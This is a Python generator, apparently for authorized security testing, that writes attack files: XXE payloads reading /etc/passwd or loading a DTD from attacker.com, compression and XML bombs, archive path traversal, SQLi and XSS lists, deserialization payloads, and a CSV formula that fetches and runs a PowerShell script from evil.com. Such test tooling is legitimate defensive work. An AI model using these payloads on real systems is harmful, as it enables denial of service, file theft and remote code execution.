#!/usr/bin/env python3
"""
Advanced Security Testing File Generator
Purpose: Generate files for testing security controls and file handling
WARNING: Use only in authorized testing environments
"""

import os
import sys
import zipfile
import gzip
import bz2
import base64
import json
import hashlib
import random
import string
from datetime import datetime
import argparse
import logging

# Optional imports with fallbacks
try:
    from fpdf import FPDF
    HAS_FPDF = True
except ImportError:
    HAS_FPDF = False

try:
    import docx
    HAS_DOCX = True
except ImportError:
    HAS_DOCX = False

try:
    import xlwt
    HAS_XLW = True
except ImportError:
    HAS_XLW = False

try:
    import pickle
    HAS_PICKLE = True
except ImportError:
    HAS_PICKLE = False

try:
    import tarfile
    HAS_TAR = True
except ImportError:
    HAS_TAR = False

try:
    import yaml
    HAS_YAML = True
except ImportError:
    HAS_YAML = False

try:
    import piexif
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# Setup logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class SecurityTestFileGenerator:
    """Main class for generating security test files"""

    def __init__(self, output_dir="test_files"):
        self.output_dir = output_dir
        self.created_files = []
        os.makedirs(output_dir, exist_ok=True)

    def get_path(self, filename):
        """Get full path for output file"""
        return os.path.join(self.output_dir, filename)

    def log_created(self, filename, description):
        """Log created file"""
        self.created_files.append(filename)
        logger.info(f"✓ Created: {filename} - {description}")

    # ================== XML ATTACKS ==================

    def generate_xxe_file(self, filename="xxe.xml", target="/etc/passwd"):
        """XXE (XML External Entity) injection"""
        payload = f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{target}">
]>
<root>&xxe;</root>"""
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write(payload)
        self.log_created(filename, "XXE payload")
        return path

    def generate_xxe_dtd(self, filename="xxe_dtd.xml"):
        """XXE with external DTD"""
        payload = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>"""
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write(payload)
        self.log_created(filename, "XXE with external DTD")
        return path

    def generate_billion_laughs(self, filename="billion_laughs.xml"):
        """Billion Laughs DoS attack"""
        payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write(payload)
        self.log_created(filename, "Billion Laughs XML bomb")
        return path

    def generate_quadratic_blowup(self, filename="quadratic_blowup.xml", size=50000):
        """Quadratic Blowup attack"""
        payload = '<?xml version="1.0"?>\n<root>\n'
        payload += '<element attr="' + 'A' * size + '">\n'
        payload += 'B' * size + '\n'
        payload += '</element>\n</root>'
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write(payload)
        self.log_created(filename, "Quadratic Blowup XML")
        return path

    # ================== ARCHIVE ATTACKS ==================

    def generate_zip_traversal(self, filename="zip_traversal.zip", depth=10):
        """ZIP with path traversal"""
        path = self.get_path(filename)
        traversal = os.path.join(*(['..'] * depth), 'evil.txt')
        with zipfile.ZipFile(path, 'w') as zf:
            zf.writestr(traversal, "Path traversal content")
        self.log_created(filename, f"ZIP path traversal (depth: {depth})")
        return path

    def generate_zip_bomb(self, filename="zip_bomb.zip", layers=3, expansion=1000):
        """Nested ZIP bomb"""
        path = self.get_path(filename)
        content = b'0' * (1024 * expansion)  # 1KB * expansion

        current_file = "layer_0.txt"
        with open(self.get_path(current_file), 'wb') as f:
            f.write(content)

        for i in range(layers):
            zip_name = f"layer_{i}.zip"
            zip_path = self.get_path(zip_name)
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
                zf.write(self.get_path(current_file), os.path.basename(current_file))
            current_file = zip_name

        # Rename final to output name
        os.rename(self.get_path(current_file), path)
        self.log_created(filename, f"ZIP bomb ({layers} layers)")
        return path

    def generate_zip_symlink(self, filename="zip_symlink.zip"):
        """ZIP with symlink (Unix-specific)"""
        path = self.get_path(filename)
        with zipfile.ZipFile(path, 'w') as zf:
            # Create a fake symlink entry
            info = zipfile.ZipInfo("symlink")
            info.create_system = 3  # Unix
            info.external_attr = 0o120777 << 16  # symlink
            zf.writestr(info, "/etc/passwd")
        self.log_created(filename, "ZIP with symlink")
        return path

    def generate_tar_traversal(self, filename="tar_traversal.tar"):
        """TAR with path traversal"""
        if not HAS_TAR:
            logger.warning("tarfile not available")
            return None

        path = self.get_path(filename)
        dummy_file = self.get_path("_temp.txt")
        with open(dummy_file, "w") as f:
            f.write("malicious content")

        with tarfile.open(path, "w") as tar:
            malicious_path = os.path.join(*(['..'] * 10), 'evil.txt')
            tar.add(dummy_file, arcname=malicious_path)

        os.remove(dummy_file)
        self.log_created(filename, "TAR path traversal")
        return path

    def generate_gzip_bomb(self, filename="gzip_bomb.gz", size_mb=100):
        """GZIP compression bomb"""
        path = self.get_path(filename)
        with gzip.open(path, 'wb', compresslevel=9) as f:
            f.write(b'\0' * (1024 * 1024 * size_mb))
        self.log_created(filename, f"GZIP bomb ({size_mb}MB uncompressed)")
        return path

    def generate_bzip2_bomb(self, filename="bzip2_bomb.bz2", size_mb=100):
        """BZIP2 compression bomb"""
        path = self.get_path(filename)
        with bz2.open(path, 'wb', compresslevel=9) as f:
            f.write(b'\0' * (1024 * 1024 * size_mb))
        self.log_created(filename, f"BZIP2 bomb ({size_mb}MB uncompressed)")
        return path

    # ================== INJECTION ATTACKS ==================

    def generate_csv_injection(self, filename="csv_injection.csv"):
        """CSV formula injection"""
        payloads = [
            '=2+2',
            '=1+1+cmd|"/c calc"!A1',
            '=HYPERLINK("http://evil.com","Click")',
            '@SUM(1+1)',
            '+1+1',
            '-1+1',
            '=1+1+cmd|"/k powershell IEX(wget evil.com/shell.ps1)"!A1'
        ]
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write("Name,Value,Formula\n")
            for i, payload in enumerate(payloads):
                f.write(f"Test{i},{payload},Safe\n")
        self.log_created(filename, "CSV formula injection")
        return path

    def generate_dde_payload(self, filename="dde_payload.csv"):
        """DDE (Dynamic Data Exchange) injection"""
        payloads = [
            '=cmd|"/c calc"!A1',
            '=MSEXCEL|"\\..\\..\\..\\Windows\\System32\\calc.exe"',
        ]
        path = self.get_path(filename)
        with open(path, "w") as f:
            for payload in payloads:
                f.write(f"{payload}\n")
        self.log_created(filename, "DDE injection payload")
        return path

    def generate_sql_injection_file(self, filename="sql_injection.txt"):
        """File containing SQL injection payloads"""
        payloads = [
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "'; DROP TABLE users--",
            "admin' OR '1'='1'/*",
        ]
        path = self.get_path(filename)
        with open(path, "w") as f:
            for payload in payloads:
                f.write(f"{payload}\n")
        self.log_created(filename, "SQL injection payloads")
        return path

    def generate_xss_file(self, filename="xss_payloads.txt"):
        """File containing XSS payloads"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('XSS')>",
        ]
        path = self.get_path(filename)
        with open(path, "w") as f:
            for payload in payloads:
                f.write(f"{payload}\n")
        self.log_created(filename, "XSS payloads")
        return path

    # ================== POLYGLOT FILES ==================

    def generate_gifar(self, filename="polyglot.gif"):
        """GIF/JAR polyglot"""
        gif_header = b"GIF89a"
        gif_body = b"\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00"
        gif_body += b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
        js_payload = b"/*<script>alert('GIFAR')</script>*/"

        path = self.get_path(filename)
        with open(path, "wb") as f:
            f.write(gif_header + gif_body + js_payload)
        self.log_created(filename, "GIF/JAR polyglot")
        return path

    def generate_pdf_zip_polyglot(self, filename="polyglot.pdf"):
        """PDF/ZIP polyglot"""
        if not HAS_FPDF:
            logger.warning("fpdf not available")
            return None

        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        pdf.cell(200, 10, txt="Polyglot File", ln=1, align="C")
        pdf_content = pdf.output(dest='S').encode('latin-1')

        import io
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr("hidden.txt", "Hidden ZIP content")
        zip_content = zip_buffer.getvalue()

        path = self.get_path(filename)
        with open(path, "wb") as f:
            f.write(pdf_content + zip_content)
        self.log_created(filename, "PDF/ZIP polyglot")
        return path

    # ================== DOCUMENT ATTACKS ==================

    def generate_malicious_svg(self, filename="malicious.svg"):
        """SVG with embedded script"""
        payload = """<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <circle cx="100" cy="100" r="80" fill="red"/>
  <script type="text/javascript">
    <![CDATA[
      alert('SVG Script Executed');
      // This could exfiltrate data or perform actions
    ]]>
  </script>
  <foreignObject width="100" height="100">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('XSS')"></iframe>
  </foreignObject>
</svg>"""
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write(payload)
        self.log_created(filename, "Malicious SVG")
        return path

    def generate_pdf_with_js(self, filename="pdf_with_js.pdf"):
        """PDF with JavaScript"""
        if not HAS_FPDF:
            logger.warning("fpdf not available")
            return None

        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        pdf.cell(200, 10, txt="PDF with JavaScript", ln=1, align="C")
        pdf.add_js("app.alert('JavaScript in PDF');")
        path = self.get_path(filename)
        pdf.output(path)
        self.log_created(filename, "PDF with JavaScript")
        return path

    def generate_malicious_docx(self, filename="malicious.docx"):
        """DOCX with malicious content"""
        if not HAS_DOCX:
            logger.warning("python-docx not available")
            return None

        doc = docx.Document()
        doc.add_paragraph('Please enable macros to view this document.')
        doc.add_paragraph('Click here: file:///C:/Windows/System32/calc.exe')
        doc.add_paragraph('Or here: \\\\evil-server\\share\\malware.exe')
        path = self.get_path(filename)
        doc.save(path)
        self.log_created(filename, "Malicious DOCX")
        return path

    def generate_malicious_xls(self, filename="malicious.xls"):
        """XLS with formula"""
        if not HAS_XLW:
            logger.warning("xlwt not available")
            return None

        wb = xlwt.Workbook()
        sheet = wb.add_sheet('Sheet1')
        sheet.write(0, 0, xlwt.Formula('HYPERLINK("http://evil.com";"Click")'))
        sheet.write(1, 0, '=2+2')
        path = self.get_path(filename)
        wb.save(path)
        self.log_created(filename, "Malicious XLS")
        return path

    # ================== DESERIALIZATION ==================

    def generate_pickle_payload(self, filename="payload.pkl"):
        """Pickle deserialization payload"""
        if not HAS_PICKLE:
            logger.warning("pickle not available")
            return None

        class SafeRCE:
            def __reduce__(self):
                return (print, ("Pickle executed!",))

        path = self.get_path(filename)
        with open(path, 'wb') as f:
            pickle.dump(SafeRCE(), f)
        self.log_created(filename, "Pickle payload")
        return path

    def generate_yaml_payload(self, filename="payload.yaml"):
        """YAML deserialization payload"""
        payload = """!!python/object/apply:builtins.print ['YAML executed']"""
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write(payload)
        self.log_created(filename, "YAML deserialization")
        return path

    def generate_json_deserialization(self, filename="payload.json"):
        """JSON with type confusion"""
        payload = {
            "__type": "System.Windows.Forms.AxHost+State",
            "PropertyBagBinary": "AAEAAAD/////"
        }
        path = self.get_path(filename)
        with open(path, "w") as f:
            json.dump(payload, f, indent=2)
        self.log_created(filename, "JSON deserialization")
        return path

    # ================== METADATA ATTACKS ==================

    def generate_image_with_metadata(self, filename="metadata.jpg"):
        """Image with malicious EXIF data"""
        if not HAS_PIL:
            logger.warning("PIL/piexif not available")
            return None

        img = Image.new('RGB', (100, 100), color='red')
        exif_dict = {
            "0th": {
                piexif.ImageIFD.ImageDescription: b"<script>alert('XSS')</script>",
                piexif.ImageIFD.Artist: b"../../etc/passwd"
            }
        }
        exif_bytes = piexif.dump(exif_dict)
        path = self.get_path(filename)
        img.save(path, "jpeg", exif=exif_bytes)
        self.log_created(filename, "Image with malicious EXIF")
        return path

    # ================== FILE TYPE CONFUSION ==================

    def generate_double_extension(self, filename="document.pdf.exe"):
        """File with double extension"""
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write("This file has a misleading extension")
        self.log_created(filename, "Double extension file")
        return path

    def generate_null_byte_file(self, filename="file\x00.txt.exe"):
        """File with null byte in name"""
        safe_name = filename.replace('\x00', '_NULL_')
        path = self.get_path(safe_name)
        with open(path, "w") as f:
            f.write("Null byte in filename")
        self.log_created(safe_name, "Null byte filename")
        return path

    def generate_unicode_confusables(self, filename="аdmin.txt"):
        """File with Unicode confusables (Cyrillic 'а' instead of Latin 'a')"""
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write("Unicode confusable characters in filename")
        self.log_created(filename, "Unicode confusables")
        return path

    def generate_long_filename(self, filename=None):
        """File with extremely long name"""
        if not filename:
            filename = "A" * 255 + ".txt"
        try:
            path = self.get_path(filename)
            with open(path, "w") as f:
                f.write("Long filename test")
            self.log_created(filename[:50] + "...", "Long filename")
            return path
        except OSError:
            logger.warning("Long filename not supported on this filesystem")
            return None

    # ================== SPECIAL CONTENT ==================

    def generate_billion_bytes(self, filename="large_file.bin", size_gb=1):
        """Large file (sparse if supported)"""
        path = self.get_path(filename)
        size = size_gb * 1024 * 1024 * 1024
        try:
            with open(path, 'wb') as f:
                f.seek(size - 1)
                f.write(b'\0')
            self.log_created(filename, f"Sparse file ({size_gb}GB)")
            return path
        except Exception as e:
            logger.warning(f"Could not create large file: {e}")
            return None

    def generate_eicar_test(self, filename="eicar.txt"):
        """EICAR antivirus test file"""
        eicar = r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIV-TEST-FILE!$H+H*'
        path = self.get_path(filename)
        with open(path, "w") as f:
            f.write(eicar)
        self.log_created(filename, "EICAR test file")
        return path

    def generate_zip_of_zips(self, filename="nested.zip", depth=10):
        """Deeply nested ZIP files"""
        path = self.get_path(filename)
        current = self.get_path("_temp_inner.txt")
        with open(current, "w") as f:
            f.write("Deeply nested content")

        for i in range(depth):
            next_zip = self.get_path(f"_temp_{i}.zip")
            with zipfile.ZipFile(next_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(current, os.path.basename(current))
            if os.path.exists(current):
                os.remove(current)
            current = next_zip

        os.rename(current, path)
        self.log_created(filename, f"Nested ZIPs (depth: {depth})")
        return path

    # ================== BATCH OPERATIONS ==================

    def generate_all(self):
        """Generate all test files"""
        logger.info("Generating all security test files...")

        # XML attacks
        self.generate_xxe_file()
        self.generate_xxe_dtd()
        self.generate_billion_laughs()
        self.generate_quadratic_blowup()

        # Archive attacks
        self.generate_zip_traversal()
        self.generate_zip_bomb()
        self.generate_zip_symlink()
        self.generate_tar_traversal()
        self.generate_gzip_bomb(size_mb=50)
        self.generate_bzip2_bomb(size_mb=50)
        self.generate_zip_of_zips()

        # Injection attacks
        self.generate_csv_injection()
        self.generate_dde_payload()
        self.generate_sql_injection_file()
        self.generate_xss_file()

        # Polyglots
        self.generate_gifar()
        self.generate_pdf_zip_polyglot()

        # Documents
        self.generate_malicious_svg()
        self.generate_pdf_with_js()
        self.generate_malicious_docx()
        self.generate_malicious_xls()

        # Deserialization
        self.generate_pickle_payload()
        self.generate_yaml_payload()
        self.generate_json_deserialization()

        # Metadata
        self.generate_image_with_metadata()

        # File type confusion
        self.generate_double_extension()
        self.generate_null_byte_file()
        self.generate_unicode_confusables()
        self.generate_long_filename()

        # Special
        self.generate_eicar_test()

        logger.info(f"\n✓ Generated {len(self.created_files)} test files in '{self.output_dir}'")
        return self.created_files


def main():
    parser = argparse.ArgumentParser(
        description="Advanced Security Testing File Generator",
        epilog="WARNING: Use only in authorized testing environments"
    )

    parser.add_argument(
        "type",
        nargs="?",
        choices=[
            "all", "xxe", "xxe_dtd", "billion_laughs", "quadratic_blowup",
            "zip_traversal", "zip_bomb", "zip_symlink", "tar_traversal",
            "gzip_bomb", "bzip2_bomb", "csv_injection", "dde", "sql_injection",
            "xss", "gifar", "pdf_zip", "svg", "pdf_js", "docx", "xls",
            "pickle", "yaml", "json", "image_meta", "double_ext", "null_byte",
            "unicode", "long_name", "eicar", "nested_zip", "large_file"
        ],
        default="all",
        help="Type of file to generate (default: all)"
    )

    parser.add_argument("-o", "--output", default="test_files", help="Output directory")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    gen = SecurityTestFileGenerator(args.output)

    # Generate requested file type
    generators = {
        "all": gen.generate_all,
        "xxe": gen.generate_xxe_file,
        "xxe_dtd": gen.generate_xxe_dtd,
        "billion_laughs": gen.generate_billion_laughs,
        "quadratic_blowup": gen.generate_quadratic_blowup,
        "zip_traversal": gen.generate_zip_traversal,
        "zip_bomb": gen.generate_zip_bomb,
        "zip_symlink": gen.generate_zip_symlink,
        "tar_traversal": gen.generate_tar_traversal,
        "gzip_bomb": gen.generate_gzip_bomb,
        "bzip2_bomb": gen.generate_bzip2_bomb,
        "csv_injection": gen.generate_csv_injection,
        "dde": gen.generate_dde_payload,
        "sql_injection": gen.generate_sql_injection_file,
        "xss": gen.generate_xss_file,
        "gifar": gen.generate_gifar,
        "pdf_zip": gen.generate_pdf_zip_polyglot,
        "svg": gen.generate_malicious_svg,
        "pdf_js": gen.generate_pdf_with_js,
        "docx": gen.generate_malicious_docx,
        "xls": gen.generate_malicious_xls,
        "pickle": gen.generate_pickle_payload,
        "yaml": gen.generate_yaml_payload,
        "json": gen.generate_json_deserialization,
        "image_meta": gen.generate_image_with_metadata,
        "double_ext": gen.generate_double_extension,
        "null_byte": gen.generate_null_byte_file,
        "unicode": gen.generate_unicode_confusables,
        "long_name": gen.generate_long_filename,
        "eicar": gen.generate_eicar_test,
        "nested_zip": gen.generate_zip_of_zips,
        "large_file": gen.generate_billion_bytes,
    }

    generators[args.type]()


if __name__ == "__main__":
    main()
